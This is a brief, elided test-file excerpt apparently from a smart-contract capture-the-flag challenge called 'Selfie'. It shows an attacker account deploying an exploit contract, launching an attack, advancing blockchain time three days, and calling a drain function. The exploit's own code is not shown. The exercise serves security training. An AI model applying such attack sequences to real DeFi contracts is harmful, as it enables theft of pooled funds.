...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const exploitFactory = await ethers.getContractFactory("ExploitV2", deployer);
        ...
        await this.exploit.connect(attacker).attack(TOKENS_IN_POOL);

        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days

        const actionId = 1;
        
        await this.exploit.connect(attacker).drain(actionId);
